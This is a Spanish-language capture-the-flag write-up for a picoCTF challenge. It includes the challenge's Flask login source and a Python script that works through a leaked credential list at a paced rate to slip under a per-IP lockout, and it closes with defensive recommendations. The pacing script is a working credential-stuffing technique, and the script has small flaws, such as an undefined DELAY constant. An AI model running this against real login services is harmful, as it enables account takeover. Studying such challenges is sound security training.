# Writeup: Fool_the_Lockout
**Categoría:** Medium
**Fecha de conversión:** 2026-04-24

---

Fool the Lockout – Writeup

Descripción del reto


Tenemos una aplicación web con un formulario de login. El servidor implementa un rate limit por IP: permite solo 10 intentos fallidos en 30 segundos, y tras superar ese umbral bloquea la IP durante 120 segundos. El objetivo es encontrar las credenciales válidas (usuario y contraseña) de una cuenta oculta, elegida aleatoriamente de una lista pública de credenciales que se nos proporciona (creds-dump.txt). Además, nos dan el código fuente completo (app.py).


### Análisis del código fuente


El archivo app.py (Flask) contiene la lógica de limitación de tasa:


```
    Cada petición POST a /login incrementa un contador asociado a la IP real del cliente (request.remote_addr).

    El contador se reinicia cada 30 segundos (EPOCH_DURATION).

    Si el número de intentos supera MAX_REQUESTS = 10, la IP se bloquea por LOCKOUT_DURATION = 120 segundos.

    Las peticiones GET (por ejemplo a / o /logout) también pasan por exceeded_rate_limit(), pero solo las POST incrementan el contador. Sin embargo, si la IP ya está bloqueada, cualquier petición devuelve la página de "Rate Limited".

```

Punto clave: La IP se obtiene de request.remote_addr, no de cabeceras como X-Forwarded-For. Por lo tanto, no es posible evadir el límite falsificando cabeceras. La única forma es espaciar los intentos para no alcanzar el umbral de 10 en 30 segundos, o usar múltiples IPs reales (proxies, VPN, etc.).


```bash
##Vemos que bloquea durante 120s si pasas de 10 intentos en 30s
```


MAX_REQUESTS = 10      # max failed attempts before a user is locked out

EPOCH_DURATION = 30     # timeframe for failed attempts (in seconds)

LOCKOUT_DURATION = 120      # duration a user will be locked out for (in seconds)



```bash
##No funciona X-Forwarded-For porque:
```

```bash
#el código fuente de la aplicación obtiene la IP mediante request.remote_addr
```

```bash
#(la IP real de la conexión TCP), no mediante cabeceras HTTP.
```

```bash
#El servidor ignora por completo cualquier cabecera como X-Forwarded-For o X-Real-IP
```


"""For a given user IP, checks how many requests the user has made (by updating the storage) an>

the user it has exceeded the assigned rate limit.  Returns true if the user has exceeded rate l>

false otherwise. """

def exceeded_rate_limit() -> bool:          # Could do a daemon, but since checks of status are>

```
    curr_time = time.time()

    # Grab the IP of the client
    client_ip = request.remote_addr
    print(f"Request ip address: {client_ip}", flush=True)

    # refresh & add new entry to db if it doesnt exist
    refresh_request_rates_db(client_ip)
    if client_ip not in request_rates:
        request_rates[client_ip] = {
            "num_requests": 0,
            "epoch_start": -1,
            "lockout_until": -1
        }
        print(f"New entry added to db", flush=True)

    # log request if it was a POST
    if request.method == "POST":
        request_rates[client_ip]['num_requests'] += 1
        # if epoch hasnt started, set epoch
        if request_rates[client_ip]['epoch_start'] == -1:
             request_rates[client_ip]['epoch_start'] = curr_time
        print(f"DB updated - {client_ip}:{request_rates[client_ip]}", flush=True)

    # check if we exceeded rate threshold, return True if so
    if request_rates[client_ip]['num_requests'] > MAX_REQUESTS:
        if request_rates[client_ip]["lockout_until"] == -1:
            request_rates[client_ip]['lockout_until'] = curr_time + LOCKOUT_DURATION
            print("Account locked out")
            print(f"DB - {client_ip}:{request_rates[client_ip]}", flush=True)
        return True

    return False



```

```bash
┌──(root㉿kr3s4l4-PC)-[/home/kr3s4l4/picoctf/medium/Fool_the_Lockout]
```

```bash
└─# cat app.py        
```

from flask import Flask, render_template, request, redirect, url_for, session, make_response

import time

import secrets

import json



app = Flask(__name__)

app.secret_key = secrets.token_hex(16)


user_db = {}    

""" format ->

```
    username: "password"
    } 
```

"""


request_rates = {}

""" format ->

```
    "ip_addr":{
        "num_requests": int
        "epoch_start": timestamp
        "lockout_until" : int      # -1 if not locked out, timestamp of lockout end
    }
```

"""


MAX_REQUESTS = 10      # max failed attempts before a user is locked out

EPOCH_DURATION = 30     # timeframe for failed attempts (in seconds)

LOCKOUT_DURATION = 120      # duration a user will be locked out for (in seconds)


RATE_LIMITED_HTML = "<h1>Rate Limited Exceeded</h1><p>You have sent too many requests, requests from your IP will be temporarily blocked.</p>"

```
 


```

```bash
## ------------------------ HELPER FUNCTIONS ------------------------ ##
```


"""Quick function to no-cache web page responses"""

def no_cache(response):

```
    response.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, max-age=0"
    response.headers["Pragma"] = "no-cache"
    response.headers["Expires"] = "-1"
    return response


```

"""Returns true if a user is logged in, false otherwise"""

def logged_in():

```
    if "user" in session:
        return True
    return False


```

"""Returns the current user (or None if there is none)"""

def current_user():

```
    if "user" in session:
        return session["user"]
    return None


```

"""Add a new user to db"""

def add_new_user(username, password):

```
    user_db[username] = password
    print("Added (username=%s, password=%s) to user_db" % (username, password))


```

""" Updates the request rates db for a given client ip, since information will likely be stale."""

def refresh_request_rates_db(client_ip):

```
    curr_time = time.time()
    if client_ip not in request_rates:
        return
    
    # check if attempt interval has elapsed, if so sets it to 0
    epoch_start_time = request_rates[client_ip]["epoch_start"] 
    if curr_time - epoch_start_time > EPOCH_DURATION:
        request_rates[client_ip]["num_requests"] = 0
        request_rates[client_ip]["epoch_start"] = -1
    
    # if was locked out but period ended update store
    lockout_end = request_rates[client_ip]["lockout_until"]
    if (lockout_end != -1) and time.time() >= lockout_end:
        request_rates[client_ip]["lockout_until"] = -1

   
```

"""For a given user IP, checks how many requests the user has made (by updating the storage) and if 

the user it has exceeded the assigned rate limit.  Returns true if the user has exceeded rate limit, 

false otherwise. """

def exceeded_rate_limit() -> bool:          # Could do a daemon, but since checks of status are always done before updating its not really necessary

```
    curr_time = time.time()

    # Grab the IP of the client
    client_ip = request.remote_addr
    print(f"Request ip address: {client_ip}", flush=True)

    # refresh & add new entry to db if it doesnt exist
    refresh_request_rates_db(client_ip)            
    if client_ip not in request_rates:
        request_rates[client_ip] = {
            "num_requests": 0,
            "epoch_start": -1,
            "lockout_until": -1
        }
        print(f"New entry added to db", flush=True)

    # log request if it was a POST
    if request.method == "POST":
        request_rates[client_ip]['num_requests'] += 1
        # if epoch hasnt started, set epoch
        if request_rates[client_ip]['epoch_start'] == -1:
             request_rates[client_ip]['epoch_start'] = curr_time
        print(f"DB updated - {client_ip}:{request_rates[client_ip]}", flush=True)

    # check if we exceeded rate threshold, return True if so
    if request_rates[client_ip]['num_requests'] > MAX_REQUESTS:
        if request_rates[client_ip]["lockout_until"] == -1:
            request_rates[client_ip]['lockout_until'] = curr_time + LOCKOUT_DURATION
            print("Account locked out")
            print(f"DB - {client_ip}:{request_rates[client_ip]}", flush=True)
        return True

    return False


```

```bash
## ------------------------  APP ROUTES ------------------------ ##
```


""" Login portal """

@app.route("/login", methods=['GET', 'POST'])

def login():

```
    ## TODO - check rate limit
    if exceeded_rate_limit():
        return RATE_LIMITED_HTML

    # if POST, accept form data and try to add user
    if request.method == "POST":
        user_input = request.form['username']
        pswd_input = request.form['password']
        print("User input: %s, password input: %s" % (user_input, pswd_input))

        # non-existent user or bad password
        if (user_input not in user_db) or (user_db[user_input] != pswd_input):
            msg = f"Invalid username or password."
            return render_template("login.html", error=msg)
        
        # authenticate user
        session["user"] = user_input        
        print("Successfully logged in, session=%s" % (session))
        return redirect(url_for("index"))       # note 'index' refers to the FUNCTION NAME
        
    # return normal page if 'GET'
    return no_cache(make_response(render_template('login.html'))) 


```

""" Homepage """

@app.route("/", methods=['GET'])

def index():

```
    if exceeded_rate_limit():
        return RATE_LIMITED_HTML
    
    # authenticate
    if not logged_in():
        return redirect(url_for("login"))
    
     # display homepage according to login
    user = current_user()
    flag = open("/challenge/flag.txt").read().strip()
    return no_cache(make_response(render_template("index.html", user=user, flag=flag)))


```

""" Logout """

@app.route("/logout", methods=['GET'])

def logout():

```
    if exceeded_rate_limit():
        return RATE_LIMITED_HTML
    
    if "user" in session:
        session.pop('user', None)
        print("Logged out, popped session")
    return redirect(url_for("login"))


```

if __name__ == '__main__':

```
    username, password = None, None
    # get profile data
    try:
        with open("/challenge/profile.json", "r") as file:
            profile = json.load(file)
            username = profile["username"]
            password = profile["password"]
    except Exception as e:
        print(f"Error setting up profile in app:\n{e}")
        exit(1)

    # add new user
    add_new_user(username, password)
   
    # start app
    app.run(host='0.0.0.0', port=8000, debug=True)   


```

Estrategia de ataque


Dado que tenemos la lista completa de credenciales (unas 100 parejas), podemos realizar un ataque de fuerza bruta controlado:


```
    Esperar un tiempo prudencial entre cada intento POST para que en cualquier ventana de 30 segundos nunca se superen los 10 intentos.

    Con un retardo de 3 segundos entre intentos, en 30 segundos haríamos 10 intentos justo en el límite. Para estar seguros y evitar bloqueos por latencias de red, usaremos un retardo de 3.2 segundos.

    De esta forma, recorremos toda la lista en unos 320 segundos (~5 minutos) sin ser bloqueados.

    Cuando una combinación es correcta, el servidor responde con una redirección a / y luego podemos obtener la flag en la página principal.

```

Desarrollo del script


El script en Python (solve.py) automatiza el proceso:

python


import requests

import time

import re


CHALLENGE_URL = "http://candy-mountain.picoctf.net:XXXXX"  # Cambiar por la URL de la instancia

CREDS_FILE = "creds-dump.txt"

## Delay = 3.2


def main():

```
    with open(CREDS_FILE) as f:
        lines = f.read().strip().splitlines()
    
    creds = []
    for line in lines:
        if ';' in line:
            user, pwd = line.split(';', 1)
            creds.append((user, pwd))
    
    session = requests.Session()
    total = len(creds)
    
    for idx, (username, password) in enumerate(creds, 1):
        print(f"[{idx}/{total}] Probando {username}:{password}")
        
        try:
            resp = session.post(f"{CHALLENGE_URL}/login", 
                                data={"username": username, "password": password},
                                allow_redirects=False, timeout=10)
        except Exception as e:
            print(f"Error: {e}. Reintentando en 10s...")
            time.sleep(10)
            continue
        
        # Si hay redirección a "/" -> login exitoso
        if resp.status_code == 302 and resp.headers.get("Location") == "/":
            print(f"\n[+] ¡Credenciales válidas! {username}:{password}")
            # Obtener la flag desde la página principal
            flag_resp = session.get(f"{CHALLENGE_URL}/")
            flag = re.search(r"picoCTF\{[^}]+\}", flag_resp.text)
            if flag:
                print(f"[+] Flag: {flag.group()}")
            else:
                print("[+] No se encontró flag en la respuesta.")
            return
        elif "Rate Limited Exceeded" in resp.text:
            print("[-] Rate limit alcanzado. Esperando 120 segundos...")
            time.sleep(120)
            idx -= 1  # reintentar la misma credencial
        else:
            # Intento fallido normal, continuar
            pass
        
        time.sleep(DELAY)
    
    print("[-] No se encontraron credenciales.")

```

if __name__ == "__main__":

```
    main()

```

Ejecución y resultado


Al lanzar el script contra la instancia activa, tras probar varias combinaciones se encuentra la pareja deane:shoe:

text


...

[76/100] Probando deane:shoe


[+] ¡Éxito! deane:shoe

[+] **Flag**: picoCTF{********************}


Conclusión


El rate limit basado en IP no es una defensa infalible si el atacante puede controlar la frecuencia de sus intentos. En este caso, al disponer de la lista completa de credenciales y conocer el umbral, bastó con un simple slow brute force para evadir la protección. La lección es que para proteger contra ataques de fuerza bruta es recomendable combinar medidas como CAPTCHA, autenticación de dos factores o retardos exponenciales por usuario, no solo por IP.

